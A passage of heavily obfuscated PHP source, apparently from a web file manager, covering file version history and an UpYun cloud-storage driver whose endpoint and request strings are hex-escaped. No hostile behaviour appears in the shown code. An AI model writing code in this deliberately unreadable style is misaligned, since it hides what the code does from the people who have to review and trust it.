get_path_father($ÛÕÉ); if (!$ÈÑúÃ´[$÷ëºŸßƒ]) { $ÈÑúÃ´[$÷ëºŸßƒ] = array(); } $ÈÑúÃ´[$÷ëºŸßƒ][] = get_path_this($ÛÕÉ); } foreach ($ÈÑúÃ´ as $÷ëºŸßƒ => $Ğ……ß™Å) { $¬á”ÜÊ‹ = self::parsePath($÷ëºŸßƒ); if (!$¬á”ÜÊ‹) { continue; } foreach ($Ğ……ß™Å as $İ¾Ô§¾½) { $µªÜÓ„Ë = self::listData(rtrim($¬á”ÜÊ‹, $Öß—âŠ[8]) . $Öß—âŠ[8] . $İ¾Ô§¾½, !1); if ($µªÜÓ„Ë && $µªÜÓ„Ë[$Öß—âŠ[447]]) { $ü»¢£òŞ[rtrim($÷ëºŸßƒ, $Öß—âŠ[8]) . $Öß—âŠ[8] . $İ¾Ô§¾½] = count($µªÜÓ„Ë[$Öß—âŠ[447]]); } } } return $ü»¢£òŞ; } public static function add($óüÙ½×¯) { $éº‘«€¢ =& $_SERVER[ıÚ˜š²İ]; $ÁâØÄ©” = self::listData($óüÙ½×¯); if (!$ÁâØÄ©”) { return; } $îä³·÷Õ = Model($éº‘«€¢[847])->get($éº‘«€¢[1338]); $Îœ°àù× = intval($GLOBALS[$éº‘«€¢[6]][$éº‘«€¢[92]][$éº‘«€¢[1316]]); $Ÿƒ¥œ¬è = $îä³·÷Õ == $éº‘«€¢[1339] ? min(5, $Îœ°àù×) : $Îœ°àù×; if ($Îœ°àù× <= 0) { return; } $¸Ğ‰êø = IO::info($óüÙ½×¯); $€õß…â = $ÁâØÄ©”[$éº‘«€¢[447]]; if ($¸Ğ‰êø[$éº‘«€¢[79]] == 0) { return; } if ($¸Ğ‰êø[$éº‘«€¢[79]] >= 1024 * 1024 * 500) { return !1; } $ï÷ğ…¿ = IO::hashSimple($óüÙ½×¯); if ($€õß…â && $€õß…â[0][$éº‘«€¢[679]] == $ï÷ğ…¿) { return !0; } if (array_key_exists($éº‘«€¢[236], $¸Ğ‰êø) && !$¸Ğ‰êø[$éº‘«€¢[236]]) { return !1; } $Ë¿Áìî· = short_id(time()); $ºÜ’®ÕŸ = array($éº‘«€¢[477] => $Ë¿Áìî·, $éº‘«€¢[679] => $ï÷ğ…¿, $éº‘«€¢[32] => $¸Ğ‰êø[$éº‘«€¢[32]] . $éº‘«€¢[10] . date($éº‘«€¢[1340]) . rand_string(1), $éº‘«€¢[79] => $¸Ğ‰êø[$éº‘«€¢[79]], $éº‘«€¢[529] => USER_ID, $éº‘«€¢[234] => time(), $éº‘«€¢[1341] => $éº‘«€¢[12]); IO::mkdir($ÁâØÄ©”[$éº‘«€¢[1342]]); $¢éÄòíŒ = IO::copy($óüÙ½×¯, $ÁâØÄ©”[$éº‘«€¢[1342]], !1, $ºÜ’®ÕŸ[$éº‘«€¢[32]]); if (!$¢éÄòíŒ) { self::clearEmptyFolder($ÁâØÄ©”[$éº‘«€¢[1342]]); return !1; } array_unshift($€õß…â, $ºÜ’®ÕŸ); if (count($€õß…â) > $Ÿƒ¥œ¬è) { $£ËŸ£¾ = array_slice($€õß…â, $Ÿƒ¥œ¬è); foreach ($£ËŸ£¾ as $ˆ†Ûæû—) { IO::remove($ÁâØÄ©”[$éº‘«€¢[1342]] . $ˆ†Ûæû—[$éº‘«€¢[32]]); } $€õß…â = array_slice($€õß…â, 0, $Ÿƒ¥œ¬è); } return self::saveData($ÁâØÄ©”[$éº‘«€¢[1343]], $€õß…â); } public static function remove($Ù‰‰œ¼ù, $Ä²”»²Ò) { $î·öíÖ =& $_SERVER[ıÚ˜š²İ]; $ºìüÓæº = self::listData($Ù‰‰œ¼ù); $´È‹¼ß = array(); if (!$ºìüÓæº) { return !1; } foreach ($ºìüÓæº[$î·öíÖ[447]] as $Î³¸ï£Ó) { if ($Î³¸ï£Ó[$î·öíÖ[477]] == $Ä²”»²Ò) { IO::remove($ºìüÓæº[$î·öíÖ[1342]] . $Î³¸ï£Ó[$î·öíÖ[32]]); continue; } $´È‹¼ß[] = $Î³¸ï£Ó; } return self::saveData($ºìüÓæº[$î·öíÖ[1343]], $´È‹¼ß); } public static function clear($çÑç•æ·, $©§˜™šœ = true) { $Çêó‘Æ¤ =& $_SERVER[ıÚ˜š²İ]; $İ„äó¬‡ = self::listData($çÑç•æ·, $©§˜™šœ); if (!$İ„äó¬‡) { return !1; } foreach ($İ„äó¬‡[$Çêó‘Æ¤[447]] as $¢ûŸÜ™¾) { IO::remove($İ„äó¬‡[$Çêó‘Æ¤[1342]] . $¢ûŸÜ™¾[$Çêó‘Æ¤[32]]); } return self::saveData($İ„äó¬‡[$Çêó‘Æ¤[1343]], array()); } public static function moveHistory($¤öÄ¨Ã, $ˆ‚ùªƒ = '', $›š÷¼­ = '') { $÷¸À÷ä· =& $_SERVER[ıÚ˜š²İ]; $Ñ¦Â¼ù› = self::listData($¤öÄ¨Ã, !1); if (!$Ñ¦Â¼ù› || !$Ñ¦Â¼ù›[$÷¸À÷ä·[447]]) { return !1; } $Ò§Ñ†³Œ = $÷¸À÷ä·[1330]; $ˆ‚ùªƒ = $ˆ‚ùªƒ ? $ˆ‚ùªƒ : get_path_this($¤öÄ¨Ã); $›š÷¼­ = $›š÷¼­ ? $›š÷¼­ : $Ñ¦Â¼ù›[$÷¸À÷ä·[1342]]; $íËÇ—»¹ = substr(get_path_this($Ñ¦Â¼ù›[$÷¸À÷ä·[1343]]), 0, -strlen($Ò§Ñ†³Œ)); foreach ($Ñ¦Â¼ù›[$÷¸À÷ä·[447]] as $¢×ÆŞŸ¨ => $ãˆœ‡Í) { $šô·öû = $ˆ‚ùªƒ . substr($ãˆœ‡Í[$÷¸À÷ä·[32]], strlen($íËÇ—»¹)); $¸ş¨Û¿™ = IO::move($Ñ¦Â¼ù›[$÷¸À÷ä·[1342]] . $ãˆœ‡Í[$÷¸À÷ä·[32]], $›š÷¼­, !1, $šô·öû); if ($¸ş¨Û¿™) { $Ñ¦Â¼ù›[$÷¸À÷ä·[447]][$¢×ÆŞŸ¨][$÷¸À÷ä·[32]] = $šô·öû; } } $Ñ¦Â¼ù›[$÷¸À÷ä·[1343]] = IO::move($Ñ¦Â¼ù›[$÷¸À÷ä·[1343]], $›š÷¼­, !1, $ˆ‚ùªƒ . $Ò§Ñ†³Œ); self::saveData($Ñ¦Â¼ù›[$÷¸À÷ä·[1343]], $Ñ¦Â¼ù›[$÷¸À÷ä·[447]]); self::clearEmptyFolder($Ñ¦Â¼ù›[$÷¸À÷ä·[1342]]); } public static function rollback($Îİ±á…, $¦À‰ìŠÖ) { $Ô…ÅÆÈ¦ =& $_SERVER[ıÚ˜š²İ]; $”®íø¦æ = self::listData($Îİ±á…); if (!$”®íø¦æ) { return; } $Şç¨³Ò¸ = IO::info($Îİ±á…); foreach ($”®íø¦æ[$Ô…ÅÆÈ¦[447]] as $¤æÖœÑá => $™ë´š¦¯) { if ($™ë´š¦¯[$Ô…ÅÆÈ¦[477]] == $¦À‰ìŠÖ) { self::add($Îİ±á…); $Âºİ¶ş¹ = $”®íø¦æ[$Ô…ÅÆÈ¦[1342]] . $™ë´š¦¯[$Ô…ÅÆÈ¦[32]]; $¾ŞÄ¶§ë = IO::copy($Âºİ¶ş¹, IO::pathFather($Îİ±á…), REPEAT_REPLACE, $Şç¨³Ò¸[$Ô…ÅÆÈ¦[32]]); if ($¾ŞÄ¶§ë) { self::remove($Îİ±á…, $¦À‰ìŠÖ); } return $¾ŞÄ¶§ë; } } return !1; } public static function setDetail($İŸ¨ÛÍ¸, $Ó½âüİå, $àì¤š¯Á) { $·Å½±¼Ö =& $_SERVER[ıÚ˜š²İ]; $ßŒóóÎ = self::listData($İŸ¨ÛÍ¸); if (!$ßŒóóÎ) { return; } foreach ($ßŒóóÎ[$·Å½±¼Ö[447]] as $ü¶†Éí => $­ã¬ª¦Ò) { if ($­ã¬ª¦Ò[$·Å½±¼Ö[477]] == $Ó½âüİå) { $ßŒóóÎ[$·Å½±¼Ö[447]][$ü¶†Éí][$·Å½±¼Ö[1341]] = $àì¤š¯Á; self::saveData($ßŒóóÎ[$·Å½±¼Ö[1343]], $ßŒóóÎ[$·Å½±¼Ö[447]]); return !0; } } return !1; } public static function fileInfo($ìÅÈöŠ, $ûÇÂŒ€) { $â¶ôØÄ =& $_SERVER[ıÚ˜š²İ]; $¹–½–¸ = self::listData($ìÅÈöŠ); if (!$¹–½–¸) { show_json(LNG($â¶ôØÄ[108]), !1); } $¡úÊÉÏÌ = $â¶ôØÄ[12]; foreach ($¹–½–¸[$â¶ôØÄ[447]] as $Çá¨üªŠ => $âáïĞöÖ) { if ($âáïĞöÖ[$â¶ôØÄ[477]] != $ûÇÂŒ€) { continue; } $¡úÊÉÏÌ = $¹–½–¸[$â¶ôØÄ[1342]] . $âáïĞöÖ[$â¶ôØÄ[32]]; break; } if (!$¡úÊÉÏÌ) { show_json(LNG($â¶ôØÄ[108]), !1); } return IO::info($¡úÊÉÏÌ); } public static function fileOut($øĞá·¢ , $æØ¹æĞñ, $Ú½øûé¤ = false) { $şäµó” =& $_SERVER[ıÚ˜š²İ]; $ãÅÙú‡ß = self::fileInfo($øĞá·¢ , $æØ¹æĞñ); $«ÔŠÃóÍ =& $GLOBALS[$şäµó”[7]]; $Ú½øûé¤ = isset($«ÔŠÃóÍ[$şäµó”[1293]]) && $«ÔŠÃóÍ[$şäµó”[1293]] == 1; if (isset($«ÔŠÃóÍ[$şäµó”[33]]) && $«ÔŠÃóÍ[$şäµó”[33]] == $şäµó”[1344]) { return IO::fileOutImage($ãÅÙú‡ß[$şäµó”[87]], $«ÔŠÃóÍ[$şäµó”[1345]]); } IO::fileOut($ãÅÙú‡ß[$şäµó”[87]], $Ú½øûé¤, get_path_this($øĞá·¢ )); } public static function listData($÷ÉÖ”ÑÓ, $ÒªÁÍ = true) { $áÊÇİêŠ =& $_SERVER[ıÚ˜š²İ]; if ($ÒªÁÍ && !IO::exist($÷ÉÖ”ÑÓ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($÷ÉÖ”ÑÓ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¹ŠÑÆŞô = self::pathHistory($÷ÉÖ”ÑÓ); $¢°‡à©Ì = array($áÊÇİêŠ[1343] => $¹ŠÑÆŞô . $áÊÇİêŠ[1330], $áÊÇİêŠ[1342] => rtrim(get_path_father($¹ŠÑÆŞô), $áÊÇİêŠ[8]) . $áÊÇİêŠ[8], $áÊÇİêŠ[447] => array()); $•ƒ›……Ö = IO::getContent($¢°‡à©Ì[$áÊÇİêŠ[1343]]); if ($•ƒ›……Ö) { $Öà¡”å = json_decode($•ƒ›……Ö, !0); if (is_array($Öà¡”å)) { $¢°‡à©Ì[$áÊÇİêŠ[447]] = $Öà¡”å; } } return $¢°‡à©Ì; } private static function saveData($¦Œ´ıë, $¾¹â¡ş) { $µàÂÃĞ =& $_SERVER[ıÚ˜š²İ]; self::log($µàÂÃĞ[1346] . $¦Œ´ıë . $µàÂÃĞ[74] . count($¾¹â¡ş), $µàÂÃĞ[828]); if ($¾¹â¡ş) { return IO::setContent($¦Œ´ıë, json_encode($¾¹â¡ş)); } $ß›ˆå­¯ = IO::pathFather($¦Œ´ıë); IO::remove($¦Œ´ıë); self::clearEmptyFolder($ß›ˆå­¯); return !0; } public static function clearEmptyFolder($Îİ®ÕÌ‹) { $ü·äÃëä =& $_SERVER[ıÚ˜š²İ]; if (trim($Îİ®ÕÌ‹, $ü·äÃëä[8]) == trim(self::$_historyBase, $ü·äÃëä[8])) { return; } $£²ßºıĞ = IO::pathFather($Îİ®ÕÌ‹); $šßÉ¥Ù® = IO::has($Îİ®ÕÌ‹, !0); if ($šßÉ¥Ù®[$ü·äÃëä[242]] > 0 || $šßÉ¥Ù®[$ü·äÃëä[243]] > 0) { return; } IO::remove($Îİ®ÕÌ‹); self::clearEmptyFolder($£²ßºıĞ); } private static function getBasePath() { $í”¾Õì¨ =& $_SERVER[ıÚ˜š²İ]; $àËêËŒ› = Model($í”¾Õì¨[1347])->get($í”¾Õì¨[1348]); if ($àËêËŒ›) { if (!IO::exist($àËêËŒ›)) { IO::mkdir($àËêËŒ›); } if (get_path_this($àËêËŒ›) == $í”¾Õì¨[1333]) { $è—ó—Ãë = $í”¾Õì¨[1349] . rand_string(8); @rename($àËêËŒ›, get_path_father($àËêËŒ›) . $í”¾Õì¨[8] . $è—ó—Ãë); $àËêËŒ› = DATA_PATH . $è—ó—Ãë . $í”¾Õì¨[8]; file_put_contents(DATA_PATH . $í”¾Õì¨[1280], $í”¾Õì¨[12]); Model($í”¾Õì¨[1347])->set($í”¾Õì¨[1348], $àËêËŒ›); } return $àËêËŒ›; } $àËêËŒ› = DATA_PATH . $í”¾Õì¨[1349] . rand_string(8) . $í”¾Õì¨[8]; $àËêËŒ› = IO::mkdir($àËêËŒ›); $àËêËŒ› = rtrim($àËêËŒ›, $í”¾Õì¨[8]) . $í”¾Õì¨[8]; file_put_contents($àËêËŒ› . $í”¾Õì¨[1280], $í”¾Õì¨[12]); file_put_contents(DATA_PATH . $í”¾Õì¨[1280], $í”¾Õì¨[12]); Model($í”¾Õì¨[1347])->set($í”¾Õì¨[1348], $àËêËŒ›); return $àËêËŒ›; } } goto d·Á­ç¤ÁŠ; DŒ¿—‚ù‡ã: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\x3a\x2f\57\x76\60\56\141\160\x69\x2e\165\x70\171\x75\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($…ÎÃ™ÔÃ) { parent::__construct(); $this->_init($…ÎÃ™ÔÃ); } public function _init($œÌÊ§æ¯) { $•èÀõ­ =& $_SERVER[ıÚ˜š²İ]; foreach ($œÌÊ§æ¯ as $€¹İÍµî => $ˆÊ¹Å„ß) { if (isset($this->{$€¹İÍµî})) { $this->{$€¹İÍµî} = $ˆÊ¹Å„ß; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($•èÀõ­[1566] . LNG($•èÀõ­[1486])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($÷¾Šµ©, $¿çõ÷ÈÔ = "\x47\105\124") { $ªñ¦¹¨ã =& $_SERVER[ıÚ˜š²İ]; $Ã¥´¯©‡ = gmdate($ªñ¦¹¨ã[1515]); $Ê²×ĞŒ¡ = base64_encode(hash_hmac($ªñ¦¹¨ã[1567], "{$¿çõ÷ÈÔ}\46{$÷¾Šµ©}\46{$Ã¥´¯©‡}", md5("{$this->userpass}"), !0)); $ˆ³ˆÇ” = array("\x41\165\x74\150\x6f\x72\151\172\141\x74\x69\x6f\156\72\x55\120\x59\x55\116\40{$this->username}\72{$Ê²×ĞŒ¡}", "\x44\x61\x74\x65\x3a{$Ã¥´¯©‡}"); return $ˆ³ˆÇ”; } public function ussRequest($çŒ×¢¿, $É—×²Ëà = "\x47\x45\x54", $‡«¤œ‘ú = false, $Ï¡Òƒ§‘ = false, $£÷º±ëò = false) { $áŠ×Ò¥ =& $_SERVER[ıÚ˜š²İ]; $çŒ×¢¿ = trim($çŒ×¢¿, $áŠ×Ò¥[8]); $’‹Ñüì‡ = "\57{$this->bucket}\57" . rawurlencode($çŒ×¢¿); $ü’›Õ÷ô = $this->ussHeaders($’‹Ñüì‡, $É—×²Ëà); if ($Ï¡Òƒ§‘) { $ü’›Õ÷ô = array_merge($ü’›Õ÷ô, $Ï¡Òƒ§‘); } $Ÿ‹­¶­ = url_request($this->endpoint . $’‹Ñüì‡, $É—×²Ëà, $‡«¤œ‘ú, $ü’›Õ÷ô, $£÷º±ëò); if (!$Ÿ‹­¶­) { $ğ½Üƒ™ş = LNG($áŠ×Ò¥[1568]); $this->writeLog($ğ½Üƒ™ş); return array($áŠ×Ò¥[1311] => !1, $áŠ×Ò¥[1301] => $ğ½Üƒ™ş); } if (strtolower($É—×²Ëà) == $áŠ×Ò¥[230] || in_array($Ÿ‹­¶­[$áŠ×Ò¥[1311]], array($áŠ×Ò¥[264], $áŠ×Ò¥[1569]))) { $‡«¤œ‘ú = $Ÿ‹­¶­[$áŠ×Ò¥[1570]]; if (!$Ÿ‹­¶­[$áŠ×Ò¥[826]]) { $‡«¤œ‘ú = isset($‡«¤œ‘ú[0]) ? $‡«¤œ‘ú[0] : $áŠ×Ò¥[12]; } } else { $‡«¤œ‘ú = json_decode($Ÿ‹­¶­[$áŠ×Ò¥[1301]], !0); if (!$‡«¤œ‘ú) { $‡«¤œ‘ú = $Ÿ‹­¶­[$áŠ×Ò¥[1301]]; } else { if (!$Ÿ‹­¶­[$áŠ×Ò¥[826]] && isset($‡«¤œ‘ú[$áŠ×Ò¥[1571]])) { $‡«¤œ‘ú = $‡«¤œ‘ú[$áŠ×Ò¥[1571]]; } } } if (!$Ÿ‹­¶­[$áŠ×Ò¥[826]]) { $this->writeLog($this->__errorMessage($‡«¤œ‘ú)); } return array($áŠ×Ò¥[1311] => $Ÿ‹­¶­[$áŠ×Ò¥[826]], $áŠ×Ò¥[1301] => $‡«¤œ‘ú); } private function __errorMessage($¦à¨¤Î±) { $à¥Ò°´¾ =& $_SERVER[ıÚ˜š²İ]; if (!$¦à¨¤Î±) { return $à¥Ò°´¾[12]; } static $ìïŠª³¦ = null; if (!$ìïŠª³¦) { $ìïŠª³¦ = I18n::getType(); } if ($ìïŠª³¦ != $à¥Ò°´¾[1524]) { return $¦à¨¤Î±; } $ Èœ¸Ò˜ = array($à¥Ò°´¾[1572] => $à¥Ò°´¾[1573], $à¥Ò°´¾[1574] => $à¥Ò°´¾[1575], $à¥Ò°´¾[1576] => $à¥Ò°´¾[1575], $à¥Ò°´¾[1577] => $à¥Ò°´¾[1578], $à¥Ò°´¾[1579] => $à¥Ò°´¾[1580], $à¥Ò°´¾[1581] => $à¥Ò°´¾[1582], $à¥Ò°´¾[1583] => $à¥Ò°´¾[1584]); return isset($ Èœ¸Ò˜[$¦à¨¤Î±]) ? $ Èœ¸Ò˜[$¦à¨¤Î±] : $¦à¨¤Î±; } public function mkfile($‹»²¸´î, $‘‘¡³ü = '', $Îè…ÁªŠ = REPEAT_RENAME) { if ($this->setContent($‹»²¸´î, $‘‘¡³ü)) { return $this->getPathOuter($‹»²¸´î); } return !1; } public function mkdir($Ããôåã, $ïöÖıñ— = REPEAT_SKIP) { $‚Ğ¡£ó =& $_SERVER[ıÚ˜š²İ]; $îÁ¦Ñß¸ = trim($Ããôåã, $‚Ğ¡£ó[8]); if ($this->_isFolder($îÁ¦Ñß¸)) { return $this->getPathOuter($îÁ¦Ñß¸); } $¬ÙİÙ· = array($‚Ğ¡£ó[1585]); $£‡ìÓİ = $this->ussRequest($îÁ¦Ñß¸, $‚Ğ¡£ó[291], !1, $¬ÙİÙ·); return $£‡ìÓİ[$‚Ğ¡£ó[1311]] ? $this->getPathOuter($îÁ¦Ñß¸) : !1; } public function copyFile($¸ùÂ©æ†, $ÍÊ»Øƒà) { $´¾å‚—š =& $_SERVER[ıÚ˜š²İ]; $°ëÙ·˜÷ = array($´¾å‚—š[1586] . "\x2f{$this->bucket}\57{$¸ùÂ©æ†}", $´¾å‚—š[1587]); $€íŠØïš = $this->ussRequest($ÍÊ»Øƒà, $´¾å‚—š[256], !1, $°ëÙ·˜÷); return $€íŠØïš[$´¾å‚—š[1311]] ? !0 : $this->getPathOuter($ÍÊ»Øƒà); } public function moveFile($Ó´îüëÅ, $©Î÷»­™) { $äŠÂ”ÔÀ =& $_SERVER[ıÚ˜š²İ]; $ÛÆçÖ« = array($äŠÂ”ÔÀ[1588] . "\57{$this->bucket}\57{$Ó´îüëÅ}", $äŠÂ”ÔÀ[1587]); $¿¦îƒå = $this->ussRequest($©Î÷»­™, $äŠÂ”ÔÀ[256], !1, $ÛÆçÖ«); return $¿¦îƒå[$äŠÂ”ÔÀ[1311]] ? !0 : $this->getPathOuter($©Î÷»­™); } public function delFile($¨Ì°ÛÊ) { $²Œ§´Œ =& $_SERVER[ıÚ˜š²İ]; $¢°š¨‘¬ = $this->ussRequest($¨Ì°ÛÊ, $²Œ§´Œ[1589]); return $¢°š¨‘¬[$²Œ§´Œ[1311]] ? !0 : !1; } public function delFolder($˜‹ğ¢¶) { $ÙĞï™ÈÎ =& $_SERVER[ıÚ˜š²İ]; if (!$this->exist($˜‹ğ¢¶)) { return !0; } $this->listItemCache = !1; $âÎæşé = $ÙÊøÂµÚ = array(); $this->fileList($˜‹ğ¢¶, $âÎæşé, $ÙÊøÂµÚ, !0); $this->listItemCache = !0; foreach ($ÙÊøÂµÚ as $š½ìõòÊ) { $³€ƒ“şò = $this->ussRequest($š½ìõòÊ[$ÙĞï™ÈÎ[32]], $ÙĞï™ÈÎ[1589]); if (!$³€ƒ“şò[$ÙĞï™ÈÎ[1311]]) { return !1; } } usort($âÎæşé, function ($ààš¦Ë, $Ì´…©âÀ) { $ØñÔË¼° =& $_SERVER[ıÚ˜š²İ]; return substr_count($Ì´…©âÀ, $ØñÔË¼°[8]) - substr_count($ààš¦Ë, $ØñÔË¼°[8]); }); foreach ($âÎæşé as $´ÃÉö“™) { $³€ƒ“şò = $this->ussRequest($´ÃÉö“™, $ÙĞï™ÈÎ[1589]); if (!$³€ƒ“şò[$ÙĞï™ÈÎ[1311]]) { return !1; } } $³€ƒ“şò = $this->ussRequest($˜‹ğ¢¶, $ÙĞï™ÈÎ[1589]); return $³€ƒ“şò[$ÙĞï™ÈÎ[1311]]; } public function rename($ÑáÑ‡û“, $«í‘æ©ı) { if ($this->isFile($ÑáÑ‡û“)) { $«í‘æ©ı = get_path_father($ÑáÑ‡û“) . $«í‘æ©ı; return $this->moveFile($ÑáÑ‡û“, $«í‘æ©ı); } return $this->renameObject($ÑáÑ‡û“, $«í‘æ©ı); } public function fileInfo($‹øİ¯, $Îìşœş„ = false, $©£âõ»ó = array()) { $ØøŒÃŒ =& $_SERVER[ıÚ˜š²İ]; $Ğ–¥”øõ = array($ØøŒÃŒ[32] => $this->pathThis($‹øİ¯), $ØøŒÃŒ[87] => $this->getPathOuter($ØøŒÃŒ[8] . $‹øİ¯), $ØøŒÃŒ[33] => $ØøŒÃŒ[233], $ØøŒÃŒ[79] => isset($©£âõ»ó[$ØøŒÃŒ[79]]) ? $©£âõ»ó[$ØøŒÃŒ[79]] : 0, $ØøŒÃŒ[169] => $this->ext($‹øİ¯)); if ($Îìşœş„) { return $Ğ–¥”øõ; } $Ğ–¥”øõ[$ØøŒÃŒ[234]] = $Ğ–¥”øõ[$ØøŒÃŒ[88]] = 0; $Ğ–¥”øõ[$ØøŒÃŒ[235]] = $Ğ–¥”øõ[$ØøŒÃŒ[236]] = !0; if (empty($©£âõ»ó)) { $©£âõ»ó = $this->objectMeta($‹øİ¯); if (!$©£âõ»ó) { return $Ğ–¥”øõ; } } $Ğ–¥”øõ[$ØøŒÃŒ[234]] = intval($©£âõ»ó[$ØøŒÃŒ[1590]]); $Ğ–¥”øõ[$ØøŒÃŒ[88]] = intval($©£âõ»ó[$ØøŒÃŒ[1591]]); $Ğ–¥”øõ[$ØøŒÃŒ[79]] = $©£âõ»ó[$ØøŒÃŒ[79]]; return $Ğ–¥”øõ; } public function folderInfo($Ø½–Æ…, $Éé¥ÅÙ€ = false) { $“¢ÍˆŒ =& $_SERVER[ıÚ˜š²İ]; $öÚÚ›“¿ = array($“¢ÍˆŒ[32] => $this->pathThis($Ø½–Æ…), $“¢ÍˆŒ[87] => $this->getPathOuter($“¢ÍˆŒ[8] . $Ø½–Æ…), $“¢ÍˆŒ[33] => $“¢ÍˆŒ[78]); if ($Éé¥ÅÙ€) { return $öÚÚ›“¿; } $öÚÚ›“¿[$“¢ÍˆŒ[234]] = $öÚÚ›“¿[$“¢ÍˆŒ[88]] = 0; $öÚÚ›“¿[$“¢ÍˆŒ[235]] = $öÚÚ›“¿[$“¢ÍˆŒ[236]] = !0; if (empty($¬ËËšË…)) { $¬ËËšË… = $this->objectMeta($Ø½–Æ…); if (!$¬ËËšË…) { return $öÚÚ›“¿; } } $öÚÚ›“¿[$“¢ÍˆŒ[234]] = intval($¬ËËšË…[$“¢ÍˆŒ[1590]]); $öÚÚ›“¿[$“¢ÍˆŒ[88]] = intval($¬ËËšË…[$“¢ÍˆŒ[1591]]); return $öÚÚ›“¿; } private function listObjs($ĞÀ­ÉÉ‹, $ë¸Âøº = 0, $íĞêóˆ = 1000) { $¼Ûé˜¸ì =& $_SERVER[ıÚ˜š²İ]; $øÅíå» = array($¼Ûé˜¸ì[1592], $¼Ûé˜¸ì[1593] . $íĞêóˆ); if ($ë¸Âøº) { $øÅíå»[] = $¼Ûé˜¸ì[1594] . $ë¸Âøº; } $Ë‹ÒˆÔ = $this->ussRequest($ĞÀ­ÉÉ‹, $¼Ûé˜¸ì[1517], !1, $øÅíå»); return !$Ë‹ÒˆÔ[$¼Ûé˜¸ì[1311]] ? !1 : $Ë‹ÒˆÔ[$¼Ûé˜¸ì[1301]]; } private function fileList($ºãçİ´, &$ë°œ¿•½, &$×˜è‚€é, $««®´Õß = false) { $Ù¡œÃ‹Æ =& $_SERVER[ıÚ˜š²İ]; $¨÷é³ù± = $Ù¡œÃ‹Æ[12]; $ç¡™âë  = 1000; $ïæ¡™Œ = rtrim($ºãçİ´, $Ù¡œÃ‹Æ[8]) . $Ù¡œÃ‹Æ[8]; while (!0) { check_abort(); $ØĞ‡Şƒß = $this->listObjs($ºãçİ´, $¨÷é³ù±, $ç¡™âë ); if (!$ØĞ‡Şƒß) { return !1; } $¨÷é³ù± = isset($ØĞ‡Şƒß[$Ù¡œÃ‹Æ[1595]]) ? $ØĞ‡Şƒß[$Ù¡œÃ‹Æ[1595]] : $Ù¡œÃ‹Æ[12]; $¿ƒ¼ı¹‡ = isset($ØĞ‡Şƒß[$Ù¡œÃ‹Æ[1596]]) ? $ØĞ‡Şƒß[$Ù¡œÃ‹Æ[1596]] : array(); foreach ($¿ƒ¼ı¹‡ as $şÏØ—…ï) { $»İæß¹© = $şÏØ—…ï[$Ù¡œÃ‹Æ[33]] == $Ù¡œÃ‹Æ[78] ? !0 : !1; $Ôê—Ô‰‹ = ltrim($ïæ¡™Œ . $şÏØ—…ï[$Ù¡œÃ‹Æ[32]], $Ù¡œÃ‹Æ[8]) . ($»İæß¹© ? $Ù¡œÃ‹Æ[8] : $Ù¡œÃ‹Æ[12]); $ŠÑ™àÚ = array($Ù¡œÃ‹Æ[32] => $Ôê—Ô‰‹, $Ù¡œÃ‹Æ[33] => $»İæß¹© ? $Ù¡œÃ‹Æ[78] : $Ù¡œÃ‹Æ[233], $Ù¡œÃ‹Æ[79] => $şÏØ—…ï[$Ù¡œÃ‹Æ[414]], $Ù¡œÃ‹Æ[1591] => $şÏØ—…ï[$Ù¡œÃ‹Æ[1597]]); $this->cacheMethodInfoSet($Ôê—Ô‰‹, $»İæß¹©, $ŠÑ™àÚ); if ($»İæß¹©) { $ë°œ¿•½[] = $Ôê—Ô‰‹; if ($««®´Õß) { $this->fileList($Ôê—Ô‰‹, $ë°œ¿•½, $×˜è‚€é, $««®´Õß); } continue; } $×˜è‚€é[] = $ŠÑ™àÚ; } if (count($¿ƒ¼ı¹‡) < $ç¡™âë ) { break; } } $this->cacheMethodInfoSet($ºãçİ´, !0); } public function listPath($ßÃÁ“šß, $Ÿ¬°ûÓ— = false) { $ş­ÑğÇ =& $_SERVER[ıÚ˜š²İ]; $“ÑéØš = $ÓÉŠØ‘ = array(); $this->fileList($ßÃÁ“šß, $“ÑéØš, $ÓÉŠØ‘); foreach ($“ÑéØš as $© ùüÕÙ => $“­‘İøØ) { $“ÑéØš[$© ùüÕÙ] = $this->folderInfo($“­‘İøØ, $Ÿ¬°ûÓ—); } foreach ($ÓÉŠØ‘ as $© ùüÕÙ => $“­‘İøØ) { $ÓÉŠØ‘[$© ùüÕÙ] = $this->fileInfo($“­‘İøØ[$ş­ÑğÇ[32]], $Ÿ¬°ûÓ—, $“­‘İøØ); } return array($ş­ÑğÇ[85] => $“ÑéØš, $ş­ÑğÇ[86] => $ÓÉŠØ‘); } public function has($Şğ¡°, $à’ù„¦ò = false, $­ô´ÍŞ¾ = true) { $áÒğ¶„Œ =& $_SERVER[ıÚ˜š²İ]; $¬ÃèÕ÷Õ = $áÒğ¶„Œ[12]; $†ı§´ƒå = 500; $ŞáĞÔ‚‡ = 0; $ş™ü‚ê = 0; $şúüé²• = rtrim($Şğ¡°, $áÒğ¶„Œ[8]) . $áÒğ¶„Œ[8]; while (!0) { check_abort(); $‚úß¬® = $this->listObjs($Şğ¡°, $¬ÃèÕ÷Õ, $†ı§´ƒå); if (!$‚úß¬®) { return !1; } $¬ÃèÕ÷Õ = isset($‚úß¬®[$áÒğ¶„Œ[1595]]) ? $‚úß¬®[$áÒğ¶„Œ[1595]] : $áÒğ¶„Œ[12]; $ˆòŸ ´Õ = isset($‚úß¬®[$áÒğ¶„Œ[1596]]) ? $‚úß¬®[$áÒğ¶„Œ[1596]] : array(); if (empty($ˆòŸ ´Õ)) { break; } $Ú±Æñó» = array_filter($ˆòŸ ´Õ, function ($úüù£şê) { $†Æœ€£¢ =& $_SERVER[ıÚ˜š²İ]; return $úüù£şê[$†Æœ€£¢[33]] == $†Æœ€£¢[78]; }); $ÑéÏîê¸ = count($ˆòŸ ´Õ); $Ú±Æñó» = count($Ú±Æñó»); $–ˆ«ª«‡ = $ÑéÏîê¸ - $Ú±Æñó»; if ($à’ù„¦ò) { $ş™ü‚ê += $Ú±Æñó»; $ŞáĞÔ‚‡ += $–ˆ«ª«‡; if 